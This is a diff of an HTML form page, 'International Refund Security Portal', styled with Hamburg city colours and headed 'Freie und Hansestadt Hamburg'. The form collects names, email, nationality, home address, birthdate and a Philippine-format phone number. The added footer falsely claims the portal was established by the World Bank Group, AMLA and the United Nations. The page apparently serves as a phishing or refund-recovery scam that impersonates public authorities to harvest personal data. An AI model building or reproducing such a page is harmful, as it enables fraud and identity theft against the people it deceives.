@@ -3,211 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>International Refund Security Portal - Project</title>
+    <title>International Refund Security Portal</title>
     <style>
-        :root { 
-            --hamburg-red: #E10019; 
-            --hamburg-blue: #003063; 
-            --security-gold: #FFD700; 
-        }
+        :root { --hamburg-red: #E10019; --hamburg-blue: #003063; --security-gold: #FFD700; }
         
-        /* FADED BACKGROUND PATTERN */
         body { 
-            font-family: 'Segoe UI', Arial, sans-serif; 
-            margin: 0; 
-            padding: 20px; 
-            min-height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: flex-start;
+            font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; min-height: 100vh; 
+            display: flex; justify-content: center; align-items: flex-start;
             background: linear-gradient(rgba(0, 48, 99, 0.94), rgba(0, 48, 99, 0.94)),
             linear-gradient(30deg, #001a36 12%, transparent 12.5%, transparent 87%, #001a36 87.5%, #001a36),
             linear-gradient(150deg, #001a36 12%, transparent 12.5%, transparent 87%, #001a36 87.5%, #001a36),
             linear-gradient(60deg, #00254d 25%, transparent 25.5%, transparent 75%, #00254d 75%, #00254d);
-            background-size: 80px 140px;
-            overflow-x: hidden;
+            background-size: 80px 140px; overflow-x: hidden;
         }
 
-        /* PAGE WRAPPER PARA SA KABILAANG TEXT */
-        .page-wrapper { 
-            display: flex; 
-            align-items: flex-start; 
-            justify-content: center; 
-            width: 100%; 
-            max-width: 1800px; 
-            gap: 50px; 
-            padding-top: 60px; 
-        }
+        .page-wrapper { display: flex; align-items: flex-start; justify-content: center; width: 100%; max-width: 1800px; gap: 50px; padding-top: 50px; }
 
-        /* LARGE SIDE TEXTS (MISSION & VISION) */
-        .side-text { 
-            width: 380px; 
-            color: white; 
-            line-height: 1.6; 
-            margin-top: 180px; /* Pantay sa gitna ng form */
-        }
-        .side-text h3 { 
-            color: var(--security-gold); 
-            text-transform: uppercase; 
-            font-size: 28px; 
-            margin-bottom: 20px; 
-            border-bottom: 3px solid var(--security-gold); 
-            display: inline-block; 
-            padding-bottom: 5px; 
-            font-weight: 900; 
-        }
-        .side-text p { 
-            font-size: 18px; 
-            font-weight: 500; 
-            text-align: justify; 
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.8); 
-        }
+        .side-text { width: 380px; color: white; line-height: 1.6; margin-top: 150px; }
+        .side-text h3 { color: var(--security-gold); text-transform: uppercase; font-size: 28px; margin-bottom: 20px; border-bottom: 3px solid var(--security-gold); display: inline-block; padding-bottom: 5px; font-weight: 900; }
+        .side-text p { font-size: 18px; font-weight: 500; text-align: justify; text-shadow: 2px 2px 4px rgba(0,0,0,0.8); }
 
-        /* MAIN FORM CONTAINER */
         .form-container { 
-            background: #ffffff; 
-            width: 100%; 
-            max-width: 900px; 
-            border-radius: 4px; 
-            box-shadow: 0 50px 150px rgba(0,0,0,0.9); 
-            overflow: hidden; 
-            border-top: 15px solid var(--hamburg-red); 
-            position: relative; 
-            z-index: 10;
+            background: #ffffff; width: 100%; max-width: 900px; border-radius: 4px; 
+            box-shadow: 0 50px 150px rgba(0,0,0,0.9); overflow: hidden; 
+            border-top: 15px solid var(--hamburg-red); position: relative; z-index: 10;
         }
 
-        .security-banner { 
-            background: var(--hamburg-blue); 
-            color: white; 
-            padding: 14px; 
-            text-align: center; 
-            font-size: 12px; 
-            font-weight: bold; 
-            text-transform: uppercase; 
-            border-bottom: 3px solid var(--security-gold); 
-            letter-spacing: 2px; 
-        }
+        .security-banner { background: var(--hamburg-blue); color: white; padding: 14px; text-align: center; font-size: 12px; font-weight: bold; text-transform: uppercase; border-bottom: 3px solid var(--security-gold); letter-spacing: 2px; }
         
-        /* HEADER WITH GLOBAL DECLARATION */
-        .header { 
-            padding: 45px 40px; 
-            text-align: center; 
-            background: #fff; 
-            border-bottom: 8px solid var(--hamburg-blue); 
-        }
-        .header h1 { 
-            color: var(--hamburg-blue); 
-            margin: 0; 
-            font-size: 32px; 
-            font-weight: 900; 
-            text-transform: uppercase; 
-            border: 2px solid var(--hamburg-blue); 
-            display: inline-block; 
-            padding: 10px 20px; 
-        }
-        .header .declaration { 
-            margin: 20px auto 0; 
-            color: #333; 
-            font-weight: 800; 
-            font-size: 13px; 
-            text-transform: uppercase; 
-            letter-spacing: 0.5px; 
-            max-width: 750px; 
-            line-height: 1.5; 
-        }
+        .header { padding: 45px 40px; text-align: center; background: #fff; border-bottom: 8px solid var(--hamburg-blue); }
+        .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
+        .header .declaration { margin: 20px auto 0; color: #333; font-weight: 800; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; max-width: 750px; line-height: 1.5; }
         
         .section-box { padding: 50px; }
-        h2 { 
-            font-size: 20px; 
-            color: var(--hamburg-blue); 
-            margin-bottom: 30px; 
-            font-weight: 800; 
-            text-transform: uppercase; 
-            border-bottom: 2px solid #eee; 
-            padding-bottom: 15px; 
-        }
+        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 30px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 15px; }
         
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
         
-        label { 
-            display: block; 
-            font-weight: 800; 
-            margin-bottom: 10px; 
-            font-size: 12px; 
-            color: var(--hamburg-blue); 
-            text-transform: uppercase; 
-        }
-        input, select { 
-            width: 100%; 
-            padding: 16px; 
-            border: 1px solid #bbb; 
-            box-sizing: border-box; 
-            font-size: 15px; 
-            border-radius: 2px; 
-        }
+        label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 12px; color: var(--hamburg-blue); text-transform: uppercase; }
+        input { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
         
-        .btn-container { 
-            display: flex; 
-            justify-content: flex-end; 
-            margin-top: 50px; 
-        }
-        button { 
-            background-color: var(--hamburg-blue); 
-            color: white; 
-            border: none; 
-            padding: 20px 60px; 
-            cursor: pointer; 
-            font-size: 15px; 
-            font-weight: 900; 
-            text-transform: uppercase; 
-            transition: 0.3s; 
-        }
+        .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; }
+        button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
         button:hover { background-color: var(--hamburg-red); }
+
+        /* UPDATED FOOTER WITH WORLD BANK, AMLA, UN */
+        .establishment-footer { text-align: center; padding: 30px; font-size: 13px; font-weight: 800; color: var(--hamburg-blue); background: #f4f4f4; border-top: 2px solid var(--security-gold); text-transform: uppercase; line-height: 1.6; }
+        .establishment-footer span { color: var(--hamburg-red); }
     </style>
 </head>
 <body>
 
     <div class="page-wrapper">
-        <!-- MISSION (LEFT SIDE) -->
         <div class="side-text">
             <h3>MISSION</h3>
             <p>To provide an impenetrable layer of security for every financial transaction by utilizing advanced, multi-stage verification protocols and proactive fraud detection systems that strictly safeguard our users' assets against evolving digital scams and unauthorized access during the refund process.</p>
         </div>
 
-        <!-- MAIN FORM CENTER -->
         <div class="form-container">
             <div class="security-banner">🛡️ SECURE RETURNS, SCAM FREE SERVICE</div>
             <div class="header">
                 <h1>FREIE UND HANSESTADT HAMBURG</h1>
-                <div class="declaration">
-                    GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION, ETHICAL FINANCIAL STEWARDSHIP, AND THE UNCOMPROMISING PROTECTION OF EVERY LEGITIMATE CLAIM
-                </div>
+                <div class="declaration">GLOBAL THEME & SECURITY DECLARATION: DEDICATED TO ERADICATING FRAUD THROUGH VIGILANT VERIFICATION, ETHICAL FINANCIAL STEWARDSHIP, AND THE UNCOMPROMISING PROTECTION OF EVERY LEGITIMATE CLAIM</div>
             </div>
 
-            <!-- SECTION 1 CONTENT (Puwede mo ring palitan para sa Section 2) -->
             <div class="section-box">
                 <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                 
                 <div class="grid-3">
-                    <div><label>Last Name *</label><input type="text"></div>
-                    <div><label>First Name *</label><input type="text"></div>
-                    <div><label>Middle Name *</label><input type="text"></div>
+                    <div><label>Last Name *</label><input type="text" placeholder="Enter Last Name"></div>
+                    <div><label>First Name *</label><input type="text" placeholder="Enter First Name"></div>
+                    <div><label>Middle Name *</label><input type="text" placeholder="Enter Middle Name"></div>
                 </div>
 
                 <div class="grid-2" style="margin-top:25px;">
-                    <div><label>Personal Email Address *</label><input type="email"></div>
-                    <div><label>Nationality *</label><input type="text"></div>
+                    <div><label>Personal Email Address *</label><input type="email" placeholder="example@mail.com"></div>
+                    <div><label>Nationality *</label><input type="text" placeholder="e.g. Filipino"></div>
                 </div>
 
                 <div style="margin-top:25px;">
                     <label>Residential Address *</label>
-                    <input type="text">
+                    <input type="text" placeholder="Full Home Address">
                 </div>
 
                 <div class="grid-2" style="margin-top:25px;">
-                    <div><label>Birthdate *</label><input type="date"></div>
-                    <div><label>Contact Number *</label><input type="text"></div>
+                    <div><label>Birthdate *</label><input type="text" placeholder="MM / DD / YYYY"></div>
+                    <div><label>Contact Number *</label><input type="text" placeholder="+63 000 000 0000"></div>
                 </div>
 
                 <div style="margin-top:25px;">
@@ -219,9 +101,14 @@
                     <button type="button">NEXT STEP</button>
                 </div>
             </div>
+
+            <!-- PARTNERSHIP DECLARATION -->
+            <div class="establishment-footer">
+                ESTABLISHED BY: <span>WORLD BANK GROUP</span> • <span>AMLA</span> (ANTI-MONEY LAUNDERING COUNCIL) • <span>UNITED NATIONS</span><br>
+                AUTHORIZED OPERATIONAL DATE: APRIL 20, 2025
+            </div>
         </div>
 
-        <!-- VISION (RIGHT SIDE) -->
         <div class="side-text">
             <h3>VISION</h3>
             <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where a culture of absolute transparency and sophisticated security ensures that every individual can navigate the refund ecosystem with unwavering confidence and total protection from deceptive practices.</p>
